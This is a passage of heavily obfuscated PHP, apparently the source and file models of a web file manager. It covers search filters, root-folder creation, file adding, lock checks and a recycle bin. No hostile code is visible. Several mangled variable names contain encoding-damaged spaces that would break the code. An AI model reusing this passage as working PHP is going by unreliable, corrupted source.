array($ä×ˆÄêù[503], $ä×ˆÄêù[502])))); } $this->join($¶†¦ôÑ»); $²¯ä÷ˆª = $Õşå°«®; } private function _parseSearchWhere($×á­âª) { $ƒ‰”Îóø =& $_SERVER[¹òÍ›æş]; $ËêßÀ¦ = array(); if (isset($×á­âª[$ƒ‰”Îóø[790]]) && $×á­âª[$ƒ‰”Îóø[790]]) { $ËêßÀ¦[$ƒ‰”Îóø[95]] = array($ƒ‰”Îóø[2127], $×á­âª[$ƒ‰”Îóø[790]]); } if (isset($×á­âª[$ƒ‰”Îóø[791]]) && $×á­âª[$ƒ‰”Îóø[791]]) { $îÏÅúçİ = array($ƒ‰”Îóø[2128], $×á­âª[$ƒ‰”Îóø[791]]); if ($ËêßÀ¦[$ƒ‰”Îóø[95]]) { $ËêßÀ¦[$ƒ‰”Îóø[95]] = array($ËêßÀ¦[$ƒ‰”Îóø[95]], $îÏÅúçİ, $ƒ‰”Îóø[2129]); } else { $ËêßÀ¦[$ƒ‰”Îóø[95]] = $îÏÅúçİ; } } if (isset($×á­âª[$ƒ‰”Îóø[2121]]) && $×á­âª[$ƒ‰”Îóø[2121]] > 0) { $ËêßÀ¦[$ƒ‰”Îóø[86]] = array($ƒ‰”Îóø[2127], $×á­âª[$ƒ‰”Îóø[2121]]); } if (isset($×á­âª[$ƒ‰”Îóø[2122]]) && $×á­âª[$ƒ‰”Îóø[2122]]) { $îÏÅúçİ = array($ƒ‰”Îóø[2128], $×á­âª[$ƒ‰”Îóø[2122]]); if ($ËêßÀ¦[$ƒ‰”Îóø[86]]) { $ËêßÀ¦[$ƒ‰”Îóø[86]] = array($ËêßÀ¦[$ƒ‰”Îóø[86]], $îÏÅúçİ, $ƒ‰”Îóø[2129]); } else { $ËêßÀ¦[$ƒ‰”Îóø[86]] = $îÏÅúçİ; } } if (isset($×á­âª[$ƒ‰”Îóø[628]]) && $×á­âª[$ƒ‰”Îóø[628]]) { $ËêßÀ¦[] = array($ƒ‰”Îóø[494] => $×á­âª[$ƒ‰”Îóø[628]], $ƒ‰”Îóø[492] => $×á­âª[$ƒ‰”Îóø[628]], $ƒ‰”Îóø[1027] => $ƒ‰”Îóø[1957]); } if (isset($×á­âª[$ƒ‰”Îóø[450]]) && $×á­âª[$ƒ‰”Îóø[450]]) { $ç‚—¦ê­ = $×á­âª[$ƒ‰”Îóø[450]]; if ($ç‚—¦ê­ == $ƒ‰”Îóø[85]) { $ËêßÀ¦[$ƒ‰”Îóø[448]] = 1; } else { if ($ç‚—¦ê­ == $ƒ‰”Îóø[2130]) { $ËêßÀ¦[$ƒ‰”Îóø[448]] = 0; } else { if ($ç‚—¦ê­) { $ç‚—¦ê­ = is_array($ç‚—¦ê­) ? $ç‚—¦ê­ : explode($ƒ‰”Îóø[50], $ç‚—¦ê­); $ËêßÀ¦[$ƒ‰”Îóø[450]] = array($ƒ‰”Îóø[456], $ç‚—¦ê­); $ËêßÀ¦[$ƒ‰”Îóø[448]] = 0; } } } } $this->_parseSearchParent($×á­âª, $ËêßÀ¦); if (isset($×á­âª[$ƒ‰”Îóø[1953]]) && trim($×á­âª[$ƒ‰”Îóø[1953]])) { $šØ‰Ô¬ = trim($×á­âª[$ƒ‰”Îóø[1953]]); $—ııËş = explode($ƒ‰”Îóø[53], $šØ‰Ô¬); if (strlen($šØ‰Ô¬) > 2 && (substr($šØ‰Ô¬, 0, 1) == $ƒ‰”Îóø[128] && substr($šØ‰Ô¬, -1) == $ƒ‰”Îóø[128]) || substr($šØ‰Ô¬, 0, 1) == $ƒ‰”Îóø[68] && substr($šØ‰Ô¬, -1) == $ƒ‰”Îóø[68]) { $šØ‰Ô¬ = substr($šØ‰Ô¬, 1, -1); $—ııËş = array($šØ‰Ô¬); } $ËêßÀ¦[$ƒ‰”Îóø[32]] = array(array($ƒ‰”Îóø[578], $ƒ‰”Îóø[1955] . $šØ‰Ô¬ . $ƒ‰”Îóø[1955])); if (count($—ııËş) > 1) { $ËêßÀ¦[$ƒ‰”Îóø[32]] = array(); foreach ($—ııËş as $úÃÚ¶¸ˆ) { if (!trim($úÃÚ¶¸ˆ)) { continue; } $ËêßÀ¦[$ƒ‰”Îóø[32]][] = array($ƒ‰”Îóø[578], $ƒ‰”Îóø[1955] . trim($úÃÚ¶¸ˆ) . $ƒ‰”Îóø[1955]); } } } return $ËêßÀ¦; } private function _parseSearchParent($ã¶ì‡¢£, &$á¨óºù•) { $„ÔÛÁêÚ =& $_SERVER[¹òÍ›æş]; if (!isset($ã¶ì‡¢£[$„ÔÛÁêÚ[470]]) || !$ã¶ì‡¢£[$„ÔÛÁêÚ[470]]) { return; } $¿ÄÏ˜ = $this->pathInfo($ã¶ì‡¢£[$„ÔÛÁêÚ[470]]); $§âîêÕ¤ = $¿ÄÏ˜[$„ÔÛÁêÚ[470]] . $„ÔÛÁêÚ[12] === $„ÔÛÁêÚ[208]; $Í¥ÙŒÃ = $¿ÄÏ˜[$„ÔÛÁêÚ[449]] == $„ÔÛÁêÚ[543]; if ($¿ÄÏ˜[$„ÔÛÁêÚ[560]] == $„ÔÛÁêÚ[561]) { $¦³›úïò = $this->sourceInfo($ã¶ì‡¢£[$„ÔÛÁêÚ[470]]); $¿ÄÏ˜[$„ÔÛÁêÚ[549]] = $¦³›úïò[$„ÔÛÁêÚ[549]]; } $á¨óºù•[$„ÔÛÁêÚ[618]] = array($„ÔÛÁêÚ[578], $¿ÄÏ˜[$„ÔÛÁêÚ[549]] . $ã¶ì‡¢£[$„ÔÛÁêÚ[470]] . $„ÔÛÁêÚ[579]); $î±ğúÄ÷ = isset($ã¶ì‡¢£[$„ÔÛÁêÚ[1818]]) && in_array($„ÔÛÁêÚ[543], $ã¶ì‡¢£[$„ÔÛÁêÚ[1818]]); if (!$î±ğúÄ÷ || !$Í¥ÙŒÃ || !$§âîêÕ¤ || !$¿ÄÏ˜[$„ÔÛÁêÚ[451]]) { return; } if (!AuthModel::authCheckRoot($¿ÄÏ˜[$„ÔÛÁêÚ[451]][$„ÔÛÁêÚ[452]])) { return; } $ĞÑÛ¢ = $¿ÄÏ˜[$„ÔÛÁêÚ[534]] . $„ÔÛÁêÚ[12]; if ($ĞÑÛ¢ == $„ÔÛÁêÚ[98]) { unset($á¨óºù•[$„ÔÛÁêÚ[618]]); $á¨óºù•[$„ÔÛÁêÚ[449]] = self::TYPE_GROUP; return; } $›‰ßŒï = Model($„ÔÛÁêÚ[550])->groupChildrenAll($ĞÑÛ¢); $ÍûøæÒ = count($›‰ßŒï); if ($ÍûøæÒ <= 1) { return; } $š£ª–Á = array($„ÔÛÁêÚ[470] => 0, $„ÔÛÁêÚ[449] => self::TYPE_GROUP, $„ÔÛÁêÚ[534] => array($„ÔÛÁêÚ[7], $›‰ßŒï)); $òîŞ‚£× = $this->field($„ÔÛÁêÚ[2131])->where($š£ª–Á)->limit($ÍûøæÒ)->select(); $á¨óºù•[$„ÔÛÁêÚ[618]] = array(); foreach ($òîŞ‚£× as $›şÅ®«–) { $á¨óºù•[$„ÔÛÁêÚ[618]][] = array($„ÔÛÁêÚ[578], $„ÔÛÁêÚ[559] . $›şÅ®«–[$„ÔÛÁêÚ[440]] . $„ÔÛÁêÚ[579]); } $á¨óºù•[$„ÔÛÁêÚ[618]][] = $„ÔÛÁêÚ[1957]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÅÍÅØÃÇ) { $È™Âú¶ =& $_SERVER[¹òÍ›æş]; $Áö†¤è± = Model($È™Âú¶[542])->where(array($È™Âú¶[1660] => $ÅÍÅØÃÇ))->find(); $¢•‡à—½ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÅÍÅØÃÇ, $Áö†¤è±[$È™Âú¶[32]]); $this->userDesktopAdd($¢•‡à—½); return $¢•‡à—½; } public function userDesktopAdd($ÖŒ¸”â) { $ûŒÆÉï÷ =& $_SERVER[¹òÍ›æş]; $„º»Äé = LNG($ûŒÆÉï÷[2132]); $ÚŸ¾©†« = $this->mkdir($ÖŒ¸”â, $„º»Äé); $this->metaSet($ÚŸ¾©†«, $ûŒÆÉï÷[2133], $ûŒÆÉï÷[98]); $this->metaSet($ÖŒ¸”â, $ûŒÆÉï÷[2134], $ÚŸ¾©†«); } public function userPathSafeAdd($óÛÎª½Î) { $¤„ù÷‘× =& $_SERVER[¹òÍ›æş]; $ŞŞ¡„Ñı = Model($¤„ù÷‘×[542])->getInfoFull($óÛÎª½Î); if (!$ŞŞ¡„Ñı) { return !1; } if (_get($ŞŞ¡„Ñı, $¤„ù÷‘×[564])) { return $ŞŞ¡„Ñı[$¤„ù÷‘×[504]][$¤„ù÷‘×[2135]]; } $šéÔÍñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $óÛÎª½Î, $¤„ù÷‘×[2136], $¤„ù÷‘×[471]); Model($¤„ù÷‘×[542])->metaSet($óÛÎª½Î, $¤„ù÷‘×[2135], $šéÔÍñ); $this->metaSet($šéÔÍñ, $¤„ù÷‘×[2137], $óÛÎª½Î); return $šéÔÍñ; } public function groupRootAdd($ûÙÚöšÏ) { $Î‚ñ¢÷â =& $_SERVER[¹òÍ›æş]; $ï¨äÔ‘­ = Model($Î‚ñ¢÷â[550])->where(array($Î‚ñ¢÷â[1947] => $ûÙÚöšÏ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ûÙÚöšÏ, $ï¨äÔ‘­[$Î‚ñ¢÷â[32]]); } public function systemRootPathAdd($ĞÕäÎÓÒ) { if ($ĞÕäÎÓÒ != $_SERVER[¹òÍ›æş][572]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ĞÕäÎÓÒ); } public function userRootRemove($¢ò´Ü¥Ù) { $Ìë÷òáõ = $this->targetSourceRoot(SourceModel::TYPE_USER, $¢ò´Ü¥Ù, !0); foreach ($Ìë÷òáõ as $çä¢©Ê) { if (!$çä¢©Ê) { continue; } $this->remove($çä¢©Ê[$_SERVER[¹òÍ›æş][440]], !1); } } public function groupRootRemove($¤½à¼­²) { $Ö—ê–±ï = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¤½à¼­²); if (!$Ö—ê–±ï) { return; } $this->remove($Ö—ê–±ï[$_SERVER[¹òÍ›æş][440]], !1); } private function _mkdirRoot($ğİ÷‘ß, $ÅÊÂ” Ñ, $Ş¦úôñ, $™È’üš¯ = '') { $Åó²‹ˆÓ =& $_SERVER[¹òÍ›æş]; $ÂÊ´ÈÎ = defined($Åó²‹ˆÓ[2080]) ? USER_ID : 0; $Ÿ’ÉµšÅ = array($Åó²‹ˆÓ[439] => 0, $Åó²‹ˆÓ[614] => $ğİ÷‘ß, $Åó²‹ˆÓ[615] => $ÅÊÂ” Ñ, $Åó²‹ˆÓ[612] => 1, $Åó²‹ˆÓ[616] => $ÂÊ´ÈÎ, $Åó²‹ˆÓ[617] => $ÂÊ´ÈÎ, $Åó²‹ˆÓ[613] => $™È’üš¯, $Åó²‹ˆÓ[618] => $Åó²‹ˆÓ[559], $Åó²‹ˆÓ[468] => 0, $Åó²‹ˆÓ[583] => 0, $Åó²‹ˆÓ[507] => 0, $Åó²‹ˆÓ[619] => $Åó²‹ˆÓ[12]); if ($äë¾™ÄË = $this->where($Ÿ’ÉµšÅ)->find()) { return $äë¾™ÄË[$Åó²‹ˆÓ[440]]; } $­ç»ôú‘ = "\115\157\144\x65\x6c\123\x6f\x75\x72\143\145\x2e\x6d\x6b\x64\151\x72\x52\157\157\x74\56{$ğİ÷‘ß}\x2e{$ÅÊÂ” Ñ}\56" . $Ş¦úôñ; CacheLock::lock($­ç»ôú‘); $Ÿ’ÉµšÅ[$Åó²‹ˆÓ[32]] = $Ş¦úôñ; $Õ•ôŒà = $this->add($Ÿ’ÉµšÅ); $¿íİ = array($Åó²‹ˆÓ[620] => short_id($Õ•ôŒà)); $this->where(array($Åó²‹ˆÓ[455] => $Õ•ôŒà))->save($¿íİ); CacheLock::unlock($­ç»ôú‘); return $Õ•ôŒà; } private function targetSourceRoot($êÇÕŞÍ, $Èã°Õõ¡, $ñáî‹¡Œ = false) { $„ÏâƒÚ¤ =& $_SERVER[¹òÍ›æş]; $½ı¡ÒØË = array($„ÏâƒÚ¤[439] => 0, $„ÏâƒÚ¤[614] => $êÇÕŞÍ, $„ÏâƒÚ¤[615] => $Èã°Õõ¡); if ($ñáî‹¡Œ) { $µãÒ€á = $this->where($½ı¡ÒØË)->select(); return $µãÒ€á ? $µãÒ€á : array(); } $—ˆ½ö‚¾ = $this->where($½ı¡ÒØË)->find(); return $—ˆ½ö‚¾ ? $—ˆ½ö‚¾ : array(); } public function sourceRootGroup($Ù»²í¾Ğ) { $Ì«Áİíã =& $_SERVER[¹òÍ›æş]; if (is_string($Ù»²í¾Ğ)) { $Ù»²í¾Ğ = array($Ù»²í¾Ğ); } $×Ñ¿¾Ô = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ù»²í¾Ğ, $Ì«Áİíã[199]); $Äå³œ†Ñ = array($Ì«Áİíã[407] => $×Ñ¿¾Ô, $Ì«Áİíã[404] => array($Ì«Áİíã[788] => count($Ù»²í¾Ğ))); $this->_listDataApply($Äå³œ†Ñ[$Ì«Áİíã[407]]); $this->_listMake($Äå³œ†Ñ); return array_to_keyvalue($Äå³œ†Ñ[$Ì«Áİíã[92]], $Ì«Áİíã[534]); } public function mkfile($ö®ÛÌÅ¤, $Ñ–ê¥²°, $£”ï•ß = '', $Õ´ã™ÏÒ = REPEAT_RENAME) { $ˆé¸ı’Í =& $_SERVER[¹òÍ›æş]; $—ÈÛşÇı = Model($ˆé¸ı’Í[639])->addFileByContent($£”ï•ß, $Ñ–ê¥²°); return $this->_createFileCall($ö®ÛÌÅ¤, $Ñ–ê¥²°, $—ÈÛşÇı, $Õ´ã™ÏÒ, $ˆé¸ı’Í[1371]); } public function addFile($‰ã·ÑÌ , $ƒ©ˆ€ä©, $ËìÌÍ»Ë, $˜¸şôü² = false, $ŠÉâ‘‡‚ = REPEAT_RENAME) { $ÜéÇ« = Model($_SERVER[¹òÍ›æş][639])->addFile($ƒ©ˆ€ä©, $ËìÌÍ»Ë, $˜¸şôü²); return $this->_createFileCall($‰ã·ÑÌ , $ËìÌÍ»Ë, $ÜéÇ«, $ŠÉâ‘‡‚); } public function addFileByFileID($ù– ÂÏà, $”‘ù”­Ç, $ßÄ‡Õ˜, $ù¶•ûİñ = REPEAT_RENAME) { $Š¾İÉ =& $_SERVER[¹òÍ›æş]; $ğ•Š = Model($Š¾İÉ[639])->find($”‘ù”­Ç); Model($Š¾İÉ[639])->linkAdd($”‘ù”­Ç); return $this->_createFileCall($ù– ÂÏà, $ßÄ‡Õ˜, $ğ•Š, $ù¶•ûİñ); } public function addFileByRemote($ï‰‡ , $Õ‰©§¨ , $¢½Òª†’, $ ’ÓÎõ‘ = array(), $‘´©ø®è = REPEAT_RENAME) { $İó«½¦ = Model($_SERVER[¹òÍ›æş][639])->addFileByRemote($Õ‰©§¨ , $¢½Òª†’, $ ’ÓÎõ‘); return $this->_createFileCall($ï‰‡ , $¢½Òª†’, $İó«½¦, $‘´©ø®è); } private function _createFileCall($¡åû÷ÚÚ, $ò¡’‘ƒ³, $£¤Áû¹ó, $›ª×¨„, $êµÖÜá = "\x75\x70\154\157\x61\144") { $Š»Áş‚× =& $_SERVER[¹òÍ›æş]; $Ö«İ€ü = !1; $this->setMasterDB(); $this->lockWriteStart($¡åû÷ÚÚ, $ò¡’‘ƒ³); $Ï‹Àî˜š = $this->fileNameExist($¡åû÷ÚÚ, $ò¡’‘ƒ³); $“„¶•İŠ = $this->_createFile($¡åû÷ÚÚ, $ò¡’‘ƒ³, $£¤Áû¹ó, $›ª×¨„, $Ö«İ€ü); if (!$Ö«İ€ü) { Model($Š»Áş‚×[509])->remove($£¤Áû¹ó[$Š»Áş‚×[506]]); } if ($Ö«İ€ü && $“„¶•İŠ && $“„¶•İŠ != $Ï‹Àî˜š) { Model($Š»Áş‚×[2105])->eventCreate($“„¶•İŠ, $êµÖÜá); } $this->lockWriteEnd($¡åû÷ÚÚ, $ò¡’‘ƒ³); return $“„¶•İŠ; } public function mkdir($±äñ®÷Ë, $¡’­Óœ, $ó‚Æ¨½­ = REPEAT_SKIP) { $’Äúé£‰ =& $_SERVER[¹òÍ›æş]; $this->setMasterDB(); $¸˜Äù÷® = $this->sourceInfo($±äñ®÷Ë); if (!$¸˜Äù÷®) { return !1; } $this->lockWriteStart($±äñ®÷Ë, $¡’­Óœ); if ($ó‚Æ¨½­ !== !1) { $€ç¼Òš· = $this->fileNameExist($±äñ®÷Ë, $¡’­Óœ); if ($€ç¼Òš· && $ó‚Æ¨½­ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($±äñ®÷Ë, $¡’­Óœ); return $€ç¼Òš·; } $¡’­Óœ = $this->fileNameAuto($±äñ®÷Ë, $¡’­Óœ, $ó‚Æ¨½­); } $Ÿ­Ç×ÚÁ = array($’Äúé£‰[612] => 1, $’Äúé£‰[458] => $¡’­Óœ, $’Äúé£‰[613] => $’Äúé£‰[12], $’Äúé£‰[507] => 0, $’Äúé£‰[583] => 0); $Éšû‘«Ü = $this->_addSource($Ÿ­Ç×ÚÁ, $¸˜Äù÷®); Model($’Äúé£‰[2105])->eventCreate($Éšû‘«Ü, $’Äúé£‰[1372]); $this->lockWriteEnd($±äñ®÷Ë, $¡’­Óœ); return $Éšû‘«Ü; } public function listSourceRoot($¯Êè§¹¾, $çÊùÒŒ, $œÅ„Ù¾œ = "\x73\157\165\162\143\x65\111\x44\x2c\164\141\162\147\x65\x74\x49\x44\x2c\x73\151\x7a\145") { $¤åê¬’³ =& $_SERVER[¹òÍ›æş]; $Íª¨¸ä = $¤åê¬’³[416]; $Õşı¡ëÚ = array(); $»‹ˆñ¹Ì = 1024 * 50; $ŠõÇÔõ° = is_array($ŠõÇÔõ°) ? $ŠõÇÔõ° : array(); $—Ÿ†ú°É = count($çÊùÒŒ); $•²£¯ = $this->tablePrefix . $¤åê¬’³[2138]; for ($„õÒ³âŞ = 0; $„õÒ³âŞ < $—Ÿ†ú°É; $„õÒ³âŞ++) { $ÈºÎ­… = $çÊùÒŒ[$„õÒ³âŞ]; $Íª¨¸ä .= "\123\105\x4c\x45\x43\x54\x20\x2a\x20\x46\122\117\x4d\40\50\x53\105\114\105\x43\124\x20{$œÅ„Ù¾œ}\40\106\x52\x4f\115\x20\140{$•²£¯}\140\x20\x57\x48\105\122\x45\40"; $Íª¨¸ä .= "\x60\160\x61\x72\145\x6e\164\x49\104\140\75\60\40\101\116\104\x20\140\164\141\162\x67\145\x74\x49\x44\140\75{$ÈºÎ­…}\40\101\116\x44\x20\x60\x74\141\x72\147\145\x74\124\x79\x70\145\140\75{$¯Êè§¹¾}\40\x61\x6e\144\x20\146\151\154\145\124\171\x70\145\75\x27\x27\x20\x6c\151\155\x69\x74\x20\61\x29\x20\141\163\40\164\142\137{$„õÒ³âŞ}\x20\x55\x4e\x49\117\116\40\x41\114\114\40"; if ((strlen($Íª¨¸ä) >= $»‹ˆñ¹Ì || $„õÒ³âŞ == $—Ÿ†ú°É - 1) && $Íª¨¸ä) { $Íª¨¸ä = substr($Íª¨¸ä, 0, -strlen($¤åê¬’³[1065])); $÷“ğÙ¶ = $this->query($Íª¨¸ä); $Íª¨¸ä = $¤åê¬’³[12]; $Õşı¡ëÚ = array_merge($Õşı¡ëÚ, $÷“ğÙ¶); } } return $Õşı¡ëÚ; } private function _createFile($ÍÈ…Â¯, $ñ–û±Ê, $ñÓ“‹ºŞ, $¬¿ÕàìÂ, &$çüù™¡³) { $´çóşØè =& $_SERVER[¹òÍ›æş]; $œá‡‹à = $this->sourceInfo($ÍÈ…Â¯); if (!$ñÓ“‹ºŞ || !$œá‡‹à) { return !1; } if ($¬¿ÕàìÂ !== !1) { $Úäåíƒ¹ = $this->fileNameExist($ÍÈ…Â¯, $ñ–û±Ê); } $çüù™¡³ = !0; if ($¬¿ÕàìÂ && $Úäåíƒ¹) { if ($¬¿ÕàìÂ == REPEAT_SKIP) { $çüù™¡³ = !1; return $Úäåíƒ¹; } else { if ($¬¿ÕàìÂ == REPEAT_REPLACE) { $ÙÎÃá = $this->sourceInfo($Úäåíƒ¹); $‰Æè ò¡ = $this->fileHistory($ÙÎÃá, $ñÓ“‹ºŞ[$´çóşØè[506]], $ñÓ“‹ºŞ[$´çóşØè[86]]); if (!$‰Æè ò¡) { $çüù™¡³ = !1; } else { $this->folderSizeReset($ÍÈ…Â¯); } return $Úäåíƒ¹; } else { $ñ–û±Ê = $this->fileNameAuto($ÍÈ…Â¯, $ñ–û±Ê, $¬¿ÕàìÂ, !1); } } } $ı•Ü€Šñ = array($´çóşØè[612] => 0, $´çóşØè[458] => $ñ–û±Ê, $´çóşØè[613] => substr(get_path_ext($ñ–û±Ê), 0, 10), $´çóşØè[507] => $ñÓ“‹ºŞ[$´çóşØè[506]], $´çóşØè[583] => $ñÓ“‹ºŞ[$´çóşØè[86]]); $ß“›®» = $this->_addSource($ı•Ü€Šñ, $œá‡‹à); $this->folderSizeReset($ÍÈ…Â¯, intval($ı•Ü€Šñ[$´çóşØè[86]])); return $ß“›®»; } protected function fileHistory($ÛÁİˆ¡¥, $ŸÍûÉ¡, $ä–¿±Øó) { $Ö´û±¹— =& $_SERVER[¹òÍ›æş]; if ($ÛÁİˆ¡¥[$Ö´û±¹—[506]] == $ŸÍûÉ¡) { return !1; } $this->checkLock($ÛÁİˆ¡¥[$Ö´û±¹—[440]], $ŸÍûÉ¡); Model($Ö´û±¹—[2139])->addHistory($ÛÁİˆ¡¥); $¡ŸÍøõ = array($Ö´û±¹—[617] => USER_ID, $Ö´û±¹—[462] => time(), $Ö´û±¹—[506] => $ŸÍûÉ¡, $Ö´û±¹—[86] => $ä–¿±Øó); $this->where(array($Ö´û±¹—[455] => $ÛÁİˆ¡¥[$Ö´û±¹—[440]]))->save($¡ŸÍøõ); $this->sourceCacheClear($ÛÁİˆ¡¥[$Ö´û±¹—[440]]); return !0; } public function checkLock($—‘É«º¯, $»ü¸”äÇ) { $–÷•şÃ• =& $_SERVER[¹òÍ›æş]; $÷ìÚÃ¹Ñ = $this->pathInfo($—‘É«º¯); if (!$this->fileIsLock($÷ìÚÃ¹Ñ, !0)) { return; } $Ç¾ëÊšÚ = Session::get($–÷•şÃ•[2140]); $şÖ÷óÚà = substr($÷ìÚÃ¹Ñ[$–÷•şÃ•[32]], 0, -1 - strlen($÷ìÚÃ¹Ñ[$–÷•şÃ•[184]])) . $–÷•şÃ•[1235] . $Ç¾ëÊšÚ . $–÷•şÃ•[10] . $÷ìÚÃ¹Ñ[$–÷•şÃ•[184]]; $Ã“˜…Ãç = Model($–÷•şÃ•[639])->find($»ü¸”äÇ); $this->_createFileCall($÷ìÚÃ¹Ñ[$–÷•şÃ•[470]], $şÖ÷óÚà, $Ã“˜…Ãç, REPEAT_REPLACE, $–÷•şÃ•[1371]); $ÊÌ´¯ƒÚ = $÷ìÚÃ¹Ñ[$–÷•şÃ•[504]][$–÷•şÃ•[576]]; $ÚĞ€Ä”ô = $ÊÌ´¯ƒÚ[$–÷•şÃ•[570]] ? $ÊÌ´¯ƒÚ[$–÷•şÃ•[570]] : $ÊÌ´¯ƒÚ[$–÷•şÃ•[32]]; show_json(LNG($–÷•şÃ•[2141]) . $–÷•şÃ•[2142] . LNG($–÷•şÃ•[2143]) . $–÷•şÃ•[2144] . $ÚĞ€Ä”ô . $–÷•şÃ•[2145], !1); } public function fileIsLock($ãˆœæ×İ, $¥ê›ê×Ø = false) { $ÍÙ‹š¨¹ =& $_SERVER[¹òÍ›æş]; if (!isset($ãˆœæ×İ[$ÍÙ‹š¨¹[504]]) || !$ãˆœæ×İ[$ÍÙ‹š¨¹[504]][$ÍÙ‹š¨¹[573]]) { return !1; } if ($ãˆœæ×İ[$ÍÙ‹š¨¹[504]][$ÍÙ‹š¨¹[573]] != USER_ID) { return !0; } $ÓÌ°ÄÄã = $GLOBALS[$ÍÙ‹š¨¹[6]][$ÍÙ‹š¨¹[99]][$ÍÙ‹š¨¹[574]]; if ($ãˆœæ×İ[$ÍÙ‹š¨¹[504]][$ÍÙ‹š¨¹[575]] <= time() - $ÓÌ°ÄÄã) { $this->metaSet($ãˆœæ×İ[$ÍÙ‹š¨¹[440]], $ÍÙ‹š¨¹[573], null); $this->metaSet($ãˆœæ×İ[$ÍÙ‹š¨¹[440]], $ÍÙ‹š¨¹[575], null); } if ($¥ê›ê×Ø) { $this->metaSet($ãˆœæ×İ[$ÍÙ‹š¨¹[440]], $ÍÙ‹š¨¹[575], time()); } return !1; } private function _addSource($«’’íšÆ, $š—Ìâ™) { $õñôÁª¿ =& $_SERVER[¹òÍ›æş]; $ÀÁ€ãËœ = defined($õñôÁª¿[2080]) ? USER_ID : 0; $—ƒ‚áñ = array($õñôÁª¿[614] => $š—Ìâ™[$õñôÁª¿[449]], $õñôÁª¿[615] => $š—Ìâ™[$õñôÁª¿[534]], $õñôÁª¿[616] => $ÀÁ€ãËœ, $õñôÁª¿[617] => $ÀÁ€ãËœ, $õñôÁª¿[439] => $š—Ìâ™[$õñôÁª¿[440]], $õñôÁª¿[618] => $š—Ìâ™[$õñôÁª¿[549]] . $š—Ìâ™[$õñôÁª¿[440]] . $õñôÁª¿[50], $õñôÁª¿[468] => 0, $õñôÁª¿[619] => $õñôÁª¿[12]); $«’’íšÆ = array_merge($—ƒ‚áñ, $«’’íšÆ); $this->updateModifyTime($«’’íšÆ[$õñôÁª¿[470]]); $Ë´‘á„ü = $õñôÁª¿[2146] . $š—Ìâ™[$õñôÁª¿[440]]; if (isset(self::$cacheChildList[$Ë´‘á„ü])) { unset(self::$cacheChildList[$Ë´‘á„ü]); } static $Œ£™¨‡’ = false; if (!$Œ£™¨‡’) { Hook::trigger($õñôÁª¿[602], $«’’íšÆ); $Œ£™¨‡’ = !0; } $ô²Û‰æÑ = $this->add($«’’íšÆ); $‘šõ¤÷ = array($õñôÁª¿[620] => short_id($ô²Û‰æÑ)); $this->where(array($õñôÁª¿[455] => $ô²Û‰æÑ))->save($‘šõ¤÷); $this->setNamePinyin($ô²Û‰æÑ, $«’’íšÆ[$õñôÁª¿[32]]); return $ô²Û‰æÑ; } public function remove($Ñ‡Ñ¸øõ, $”Ò¾‚Ö‹ = true) { $Ë…ç¢ƒÅ =& $_SERVER[¹òÍ›æş]; $ùáíô ß = $this->sourceInfo($Ñ‡Ñ¸øõ); $òó¿·Ü„ = intval($ùáíô ß[$Ë…ç¢ƒÅ[449]]) === self::TYPE_SYSTEM; $âè‘ñ€ = Model($Ë…ç¢ƒÅ[473])->get($Ë…ç¢ƒÅ[2147]) == $Ë…ç¢ƒÅ[98]; if ($òó¿·Ü„ || $”Ò¾‚Ö‹ || !$âè‘ñ€) { return $this->removeNow($Ñ‡Ñ¸øõ, $”Ò¾‚Ö‹); } $¤·¥ºß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $—Úï§ÎŸ = $ùáíô ß[$Ë…ç¢ƒÅ[449]] == self::TYPE_USER ? $Ë…ç¢ƒÅ[628] : $Ë…ç¢ƒÅ[543]; if ($—Úï§ÎŸ == $Ë…ç¢ƒÅ[628]) { $ÑëÄ³³ = Model($Ë…ç¢ƒÅ[542])->getInfo($ùáíô ß[$Ë…ç¢ƒÅ[534]]); $Ü¸Èòïˆ = !empty($ÑëÄ³³[$Ë…ç¢ƒÅ[570]]) ? $ÑëÄ³³[$Ë…ç¢ƒÅ[570]] : $ÑëÄ³³[$Ë…ç¢ƒÅ[32]]; $Ü¸Èòïˆ = $Ë…ç¢ƒÅ[298] . $Ü¸Èòïˆ . $Ë…ç¢ƒÅ[2148] . $ùáíô ß[$Ë…ç¢ƒÅ[534]]; } else { $ÑëÄ³³ = Model($Ë…ç¢ƒÅ[550])->getInfo($ùáíô ß[$Ë…ç¢ƒÅ[534]]); $Ü¸Èòïˆ = _get($ÑëÄ³³, $Ë…ç¢ƒÅ[32]); $Ü¸Èòïˆ = $Ë…ç¢ƒÅ[172] . $Ü¸Èòïˆ . $Ë…ç¢ƒÅ[2149] . $ùáíô ß[$Ë…ç¢ƒÅ[534]]; } $ßÕÜÊåî = $Ë…ç¢ƒÅ[2150] . md5($Ü¸Èòïˆ); CacheLock::lock($ßÕÜÊåî); $ìÚêÃÍ£ = $this->fileNameExist($¤·¥ºß, $Ü¸Èòïˆ); if (!$ìÚêÃÍ£) { $ìÚêÃÍ£ = $this->mkdir($¤·¥ºß, $Ü¸Èòïˆ, REPEAT_SKIP); $this->metaSet($ìÚêÃÍ£, $Ë…ç¢ƒÅ[2151], $—Úï§ÎŸ); $this->metaSet($ìÚêÃÍ£, $Ë…ç¢ƒÅ[2152], $ùáíô ß[$Ë…ç¢ƒÅ[534]]); if ($ùáíô ß[$Ë…ç¢ƒÅ[470]] != 0) { $this->metaSet($ìÚêÃÍ£, $Ë…ç¢ƒÅ[2153], _get($ÑëÄ³³, $Ë…ç¢ƒÅ[2154])); } } CacheLock::unlock($ßÕÜÊåî); $this->metaSet($Ñ‡Ñ¸øõ, $Ë…ç¢ƒÅ[2155], $ùáíô ß[$Ë…ç¢ƒÅ[470]]); $this->where(array($Ë…ç¢ƒÅ[440] => $Ñ‡Ñ¸øõ))->save(array($Ë…ç¢ƒÅ[462] => time())); $this->recycleClear($ùáíô ß); $Â‡»Š²Ñ = $this->move($Ñ‡Ñ¸øõ, $ìÚêÃÍ£, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ùáíô ß[$Ë…ç¢ƒÅ[470]]); return $Â‡»Š²Ñ; } private function recycleClear($Æ†îì€») { $ áé¨ñ± =& $_SERVER[¹òÍ›æş]; 